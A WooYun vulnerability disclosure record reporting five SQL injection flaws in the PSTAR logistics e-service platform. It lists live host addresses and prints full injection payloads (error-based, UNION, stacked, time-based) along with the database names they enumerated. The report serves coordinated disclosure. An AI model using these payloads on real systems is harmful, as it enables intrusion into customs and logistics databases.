{"id": 36483, "wybug_id": "wooyun-2015-0101757", "wybug_title": "PSTAR-电子服务平台SQL注入漏洞（五处打包）", "wybug_corp": "上海泛星计算机系统有限公司", "wybug_author": "路人甲", "wybug_date": "2015-03-17 16:41", "wybug_open_date": "2015-06-18 17:44", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-18：\t细节向公众公开  简要描述： 上海泛星计算机系统有限公司是一家专业开发物流管理软件与国际货运管理软件的资深物流软件公司。 详细说明：  系统名称:PSTAR-电子服务平台系统开发厂商：上海泛星计算机系统有限公司系统架构：aspx+mssql系统内大量物流报关信息。。。海关数据。。。   漏洞证明：  应乌云要求，五则案例：SQL注入漏洞一：漏洞文件：warehouse/warehouse_n_q.aspxhttp://61.174.22.102/warehouse/warehouse_n_q.aspxhttp://222.173.113.84:8888/warehouse/warehouse_n_q.aspxhttp://122.227.225.98:8888/warehouse/warehouse_n_q.aspxhttp://180.166.7.114:8888/warehouse/warehouse_n_q.aspxhttp://www.kaseshanghai.com/warehouse/warehouse_n_q.aspx等如：http://61.174.22.102/warehouse/warehouse_n_q.aspx\n\n</code>' and 1>@@version--获取数据库版本信息：\n\n' and 1>db_name()--获取当前数据库：\n\nSQL注入漏洞二：漏洞文件：custom/customall.aspx注入参数：docuno案例如下：http://61.174.22.102/custom/customall.aspxhttp://222.173.113.84:8888/custom/customall.aspxhttp://122.227.225.98:8888/custom/customall.aspxhttp://180.166.7.114:8888/custom/customall.aspxhttp://www.kaseshanghai.com/custom/customall.aspxhttp://61.174.22.102/custom/customall.aspx为例：数据包如下：\nPOST /custom/customall.aspx HTTP/1.1Host: 61.174.22.102Proxy-Connection: keep-aliveContent-Length: 394Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://61.174.22.102User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://61.174.22.102/custom/customall.aspxAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: AspxAutoDetectCookieSupport=1; ASP.NET_SessionId=lblgjum5z140wq55xti33m3u; checkcode=2421__VIEWSTATE=%2FwEPDwULLTE5MTIxMTQ2NjcPZBYCAgMPZBYCAgQPDxYCHgRUZXh0BVzmiJHlj7jpnIAz5Liq5bel5L2c55qE55CG5Y2V5pe26Ze077yM6K%2B35Zyo5rW35YWz6YCA5Zue5pelM%2BS4quW3peS9nOaXpeWQjuWPluWPr%2BWPlueahOWNleWtkGRkZAlstJqBhOSKde3tYOq1sU%2BTfi26&__VIEWSTATEGENERATOR=FF121069&__EVENTVALIDATION=%2FwEWBAL3xdGfCALLoY6XBAKAvMiLDQLw9J%2BEBaZ3LKKE%2BwXtVzDhVOMxtIZw1F7U&docuno=aa&thblno=aa&btnQueryAll=%B2%E9%D1%AF\n\n\n\nPlace: POSTParameter: docuno    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: __VIEWSTATE=/wEPDwULLTE5MTIxMTQ2NjcPZBYCAgMPZBYkAgQPDxYCHgRUZXh0BVzmiJHlj7jpnIAz5Liq5bel5L2c55qE55CG5Y2V5pe26Ze077yM6K 35Zyo5rW35YWz6YCA5Zue5pelM S4quW3peS9nOaXpeWQjuWPluWPr WPlueahOWNleWtkGRkAgUPDxYCHwBlZGQCBg8PFgIfAGVkZAIHDw8WAh8AZWRkAggPDxYCHwBlZGQCCQ8PFgIfAGVkZAIKDw8WAh8AZWRkAgsPDxYCHwBlZGQCDA8PFgIfAGVkZAINDw8WAh8AZWRkAg4PDxYCHwBlZGQCDw8PFgIfAGVkZAIQDw8WAh8AZWRkAhEPDxYCHwBlZGQCEg8PFgIfAGVkZAITDw8WAh8AZWRkAhQPDxYCHwBlZGQCFQ8PFgIfAGVkZGQtj5xRNoYM3/ps4SaFWuKQjtAGdQ==&__VIEWSTATEGENERATOR=FF121069&__EVENTVALIDATION=/wEWBALF48S/AQLLoY6XBAKAvMiLDQLw9J EBbu2co2Zo3a0p4zy0XgBQHFyafRl&docuno=aa' AND 1573=CONVERT(INT,(CHAR(58) CHAR(101) CHAR(113) CHAR(106) CHAR(58) (SELECT (CASE WHEN (1573=1573) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(58) CHAR(109) CHAR(114) CHAR(119) CHAR(58))) AND 'Mrog'='Mrog&thblno=aa&btnQueryAll=%B2%E9%D1%AF    Type: UNION query    Title: Generic UNION query (NULL) - 21 columns    Payload: __VIEWSTATE=/wEPDwULLTE5MTIxMTQ2NjcPZBYCAgMPZBYkAgQPDxYCHgRUZXh0BVzmiJHlj7jpnIAz5Liq5bel5L2c55qE55CG5Y2V5pe26Ze077yM6K 35Zyo5rW35YWz6YCA5Zue5pelM S4quW3peS9nOaXpeWQjuWPluWPr WPlueahOWNleWtkGRkAgUPDxYCHwBlZGQCBg8PFgIfAGVkZAIHDw8WAh8AZWRkAggPDxYCHwBlZGQCCQ8PFgIfAGVkZAIKDw8WAh8AZWRkAgsPDxYCHwBlZGQCDA8PFgIfAGVkZAINDw8WAh8AZWRkAg4PDxYCHwBlZGQCDw8PFgIfAGVkZAIQDw8WAh8AZWRkAhEPDxYCHwBlZGQCEg8PFgIfAGVkZAITDw8WAh8AZWRkAhQPDxYCHwBlZGQCFQ8PFgIfAGVkZGQtj5xRNoYM3/ps4SaFWuKQjtAGdQ==&__VIEWSTATEGENERATOR=FF121069&__EVENTVALIDATION=/wEWBALF48S/AQLLoY6XBAKAvMiLDQLw9J EBbu2co2Zo3a0p4zy0XgBQHFyafRl&docuno=aa' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(58) CHAR(101) CHAR(113) CHAR(106) CHAR(58) CHAR(83) CHAR(79) CHAR(82) CHAR(72) CHAR(86)CHAR(90) CHAR(119) CHAR(108) CHAR(115) CHAR(90) CHAR(58) CHAR(109) CHAR(114) CHAR(119) CHAR(58),NULL,NULL,NULL,NULL-- &thblno=aa&btnQueryAll=%B2%E9%D1%AF    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: __VIEWSTATE=/wEPDwULLTE5MTIxMTQ2NjcPZBYCAgMPZBYkAgQPDxYCHgRUZXh0BVzmiJHlj7jpnIAz5Liq5bel5L2c55qE55CG5Y2V5pe26Ze077yM6K 35Zyo5rW35YWz6YCA5Zue5pelM S4quW3peS9nOaXpeWQjuWPluWPr WPlueahOWNleWtkGRkAgUPDxYCHwBlZGQCBg8PFgIfAGVkZAIHDw8WAh8AZWRkAggPDxYCHwBlZGQCCQ8PFgIfAGVkZAIKDw8WAh8AZWRkAgsPDxYCHwBlZGQCDA8PFgIfAGVkZAINDw8WAh8AZWRkAg4PDxYCHwBlZGQCDw8PFgIfAGVkZAIQDw8WAh8AZWRkAhEPDxYCHwBlZGQCEg8PFgIfAGVkZAITDw8WAh8AZWRkAhQPDxYCHwBlZGQCFQ8PFgIfAGVkZGQtj5xRNoYM3/ps4SaFWuKQjtAGdQ==&__VIEWSTATEGENERATOR=FF121069&__EVENTVALIDATION=/wEWBALF48S/AQLLoY6XBAKAvMiLDQLw9J EBbu2co2Zo3a0p4zy0XgBQHFyafRl&docuno=aa'; WAITFOR DELAY '0:0:5'--&thblno=aa&btnQueryAll=%B2%E9%D1%AF    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: __VIEWSTATE=/wEPDwULLTE5MTIxMTQ2NjcPZBYCAgMPZBYkAgQPDxYCHgRUZXh0BVzmiJHlj7jpnIAz5Liq5bel5L2c55qE55CG5Y2V5pe26Ze077yM6K 35Zyo5rW35YWz6YCA5Zue5pelM S4quW3peS9nOaXpeWQjuWPluWPr WPlueahOWNleWtkGRkAgUPDxYCHwBlZGQCBg8PFgIfAGVkZAIHDw8WAh8AZWRkAggPDxYCHwBlZGQCCQ8PFgIfAGVkZAIKDw8WAh8AZWRkAgsPDxYCHwBlZGQCDA8PFgIfAGVkZAINDw8WAh8AZWRkAg4PDxYCHwBlZGQCDw8PFgIfAGVkZAIQDw8WAh8AZWRkAhEPDxYCHwBlZGQCEg8PFgIfAGVkZAITDw8WAh8AZWRkAhQPDxYCHwBlZGQCFQ8PFgIfAGVkZGQtj5xRNoYM3/ps4SaFWuKQjtAGdQ==&__VIEWSTATEGENERATOR=FF121069&__EVENTVALIDATION=/wEWBALF48S/AQLLoY6XBAKAvMiLDQLw9J EBbu2co2Zo3a0p4zy0XgBQHFyafRl&docuno=aa' WAITFOR DELAY '0:0:5'--&thblno=aa&btnQueryAll=%B2%E9%D1%AF---\n\n\n当前数据库：\n\nSQL注入漏洞三：漏洞文件：custom/customall.aspx注入参数：thblno部分案例：http://61.174.22.102/custom/customall.aspxhttp://222.173.113.84:8888/custom/customall.aspxhttp://122.227.225.98:8888/custom/customall.aspxhttp://180.166.7.114:8888/custom/customall.aspxhttp://www.kaseshanghai.com/custom/customall.aspxhttp://61.174.22.102/custom/customall.aspx为例：\nPlace: POSTParameter: thblno    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: __VIEWSTATE=/wEPDwULLTE5MTIxMTQ2NjcPZBYCAgMPZBYkAgQPDxYCHgRUZXh0BVzmiJHlj7jpnIAz5Liq5bel5L2c55qE55CG5Y2V5pe26Ze077yM6K 35Zyo5rW35YWz6YCA5Zue5pelM S4quW3peS9nOaXpeWQjuWPluWPr WPlueahOWNleWtkGRkAgUPDxYCHwBlZGQCBg8PFgIfAGVkZAIHDw8WAh8AZWRkAggPDxYCHwBlZGQCCQ8PFgIfAGVkZAIKDw8WAh8AZWRkAgsPDxYCHwBlZGQCDA8PFgIfAGVkZAINDw8WAh8AZWRkAg4PDxYCHwBlZGQCDw8PFgIfAGVkZAIQDw8WAh8AZWRkAhEPDxYCHwBlZGQCEg8PFgIfAGVkZAITDw8WAh8AZWRkAhQPDxYCHwBlZGQCFQ8PFgIfAGVkZGQtj5xRNoYM3/ps4SaFWuKQjtAGdQ==&__VIEWSTATEGENERATOR=FF121069&__EVENTVALIDATION=/wEWBALF48S/AQLLoY6XBAKAvMiLDQLw9J EBbu2co2Zo3a0p4zy0XgBQHFyafRl&docuno=aa&thblno=aa' AND 1712=CONVERT(INT,(CHAR(58) CHAR(101) CHAR(113) CHAR(106) CHAR(58) (SELECT (CASE WHEN (1712=1712) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(58) CHAR(109) CHAR(114) CHAR(119) CHAR(58))) AND 'YIoZ'='YIoZ&btnQueryAll=%B2%E9%D1%AF    Type: UNION query    Title: Generic UNION query (NULL) - 21 columns    Payload: __VIEWSTATE=/wEPDwULLTE5MTIxMTQ2NjcPZBYCAgMPZBYkAgQPDxYCHgRUZXh0BVzmiJHlj7jpnIAz5Liq5bel5L2c55qE55CG5Y2V5pe26Ze077yM6K 35Zyo5rW35YWz6YCA5Zue5pelM S4quW3peS9nOaXpeWQjuWPluWPr WPlueahOWNleWtkGRkAgUPDxYCHwBlZGQCBg8PFgIfAGVkZAIHDw8WAh8AZWRkAggPDxYCHwBlZGQCCQ8PFgIfAGVkZAIKDw8WAh8AZWRkAgsPDxYCHwBlZGQCDA8PFgIfAGVkZAINDw8WAh8AZWRkAg4PDxYCHwBlZGQCDw8PFgIfAGVkZAIQDw8WAh8AZWRkAhEPDxYCHwBlZGQCEg8PFgIfAGVkZAITDw8WAh8AZWRkAhQPDxYCHwBlZGQCFQ8PFgIfAGVkZGQtj5xRNoYM3/ps4SaFWuKQjtAGdQ==&__VIEWSTATEGENERATOR=FF121069&__EVENTVALIDATION=/wEWBALF48S/AQLLoY6XBAKAvMiLDQLw9J EBbu2co2Zo3a0p4zy0XgBQHFyafRl&docuno=aa&thblno=aa' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(58) CHAR(101) CHAR(113) CHAR(106) CHAR(58) CHAR(112) CHAR(90) CHAR(113) CHAR(76) CHAR(88) CHAR(101) CHAR(78) CHAR(74) CHAR(87) CHAR(121) CHAR(58) CHAR(109) CHAR(114) CHAR(119) CHAR(58),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- &btnQueryAll=%B2%E9%D1%AF    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: __VIEWSTATE=/wEPDwULLTE5MTIxMTQ2NjcPZBYCAgMPZBYkAgQPDxYCHgRUZXh0BVzmiJHlj7jpnIAz5Liq5bel5L2c55qE55CG5Y2V5pe26Ze077yM6K 35Zyo5rW35YWz6YCA5Zue5pelM S4quW3peS9nOaXpeWQjuWPluWPr WPlueahOWNleWtkGRkAgUPDxYCHwBlZGQCBg8PFgIfAGVkZAIHDw8WAh8AZWRkAggPDxYCHwBlZGQCCQ8PFgIfAGVkZAIKDw8WAh8AZWRkAgsPDxYCHwBlZGQCDA8PFgIfAGVkZAINDw8WAh8AZWRkAg4PDxYCHwBlZGQCDw8PFgIfAGVkZAIQDw8WAh8AZWRkAhEPDxYCHwBlZGQCEg8PFgIfAGVkZAITDw8WAh8AZWRkAhQPDxYCHwBlZGQCFQ8PFgIfAGVkZGQtj5xRNoYM3/ps4SaFWuKQjtAGdQ==&__VIEWSTATEGENERATOR=FF121069&__EVENTVALIDATION=/wEWBALF48S/AQLLoY6XBAKAvMiLDQLw9J EBbu2co2Zo3a0p4zy0XgBQHFyafRl&docuno=aa&thblno=aa'; WAITFOR DELAY '0:0:5'--&btnQueryAll=%B2%E9%D1%AF    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: __VIEWSTATE=/wEPDwULLTE5MTIxMTQ2NjcPZBYCAgMPZBYkAgQPDxYCHgRUZXh0BVzmiJHlj7jpnIAz5Liq5bel5L2c55qE55CG5Y2V5pe26Ze077yM6K 35Zyo5rW35YWz6YCA5Zue5pelM S4quW3peS9nOaXpeWQjuWPluWPr WPlueahOWNleWtkGRkAgUPDxYCHwBlZGQCBg8PFgIfAGVkZAIHDw8WAh8AZWRkAggPDxYCHwBlZGQCCQ8PFgIfAGVkZAIKDw8WAh8AZWRkAgsPDxYCHwBlZGQCDA8PFgIfAGVkZAINDw8WAh8AZWRkAg4PDxYCHwBlZGQCDw8PFgIfAGVkZAIQDw8WAh8AZWRkAhEPDxYCHwBlZGQCEg8PFgIfAGVkZAITDw8WAh8AZWRkAhQPDxYCHwBlZGQCFQ8PFgIfAGVkZGQtj5xRNoYM3/ps4SaFWuKQjtAGdQ==&__VIEWSTATEGENERATOR=FF121069&__EVENTVALIDATION=/wEWBALF48S/AQLLoY6XBAKAvMiLDQLw9J EBbu2co2Zo3a0p4zy0XgBQHFyafRl&docuno=aa&thblno=aa' WAITFOR DELAY '0:0:5'--&btnQueryAll=%B2%E9%D1%AF---\n数据库：available databases [9]:[*] hyeport[*] master[*] model[*] msdb[*] Northwind[*] pstarnet[*] pubs[*] tempdb[*] wavefax5SQL注入四：漏洞文件：bill/bill_q.aspx注入参数：bkno部分案例如下：http://61.174.22.102/bill/bill_q.aspxhttp://222.173.113.84:8888/bill/bill_q.aspxhttp://122.227.225.98:8888/bill/bill_q.aspxhttp://180.166.7.114:8888/bill/bill_q.aspxhttp://www.kaseshanghai.com/bill/bill_q.aspx即业务编号处可直接执行SQL语句：如：http://61.174.22.102/bill/bill_q.aspx\n\n当前数据库版本信息：\n\n当前数据库信息：\n\nSQL注入漏洞五：漏洞文件：bill/bill_q.aspx注入参数：SHREF_NO同时可载入如下post包：\n__VIEWSTATE=%2FwEPDwULLTEwODk0NTMzODYPZBYCAgMPZBYGAgEPDxYCHgdWaXNpYmxlZ2RkAgIPDxYCHwBnZGQCAw8PFgIeBFRleHQFDOWIhuaPkOWNleWPt2RkZHXs65Fc9gBeF05SMW%2BupJlsT8UC&__VIEWSTATEGENERATOR=ADE19E14&__EVENTVALIDATION=%2FwEWBALT%2B72LAgKSoqLWDgLl%2BdGUCgL9kpmPAXw9gDDHrB3pzMPS6Bp9PR9i%2FiCA&bkno=aaa&SHREF_NO=aaaa&btnOk=%B2%E9%D1%AF%26%B4%F2%D3%A1%D4%A4%C0%C0\n如：http://61.174.22.102/bill/bill_q.aspx分提单号可直接执行SQL语句：\n\n\n\n其他如上！   修复方案：  参数过滤啊 毕竟海关数据   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-03-20 17:42 厂商回复： CNVD确认所述漏洞情况，暂未建立与软件生产厂商（或网站管理单位）的直接处置渠道，待认领。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}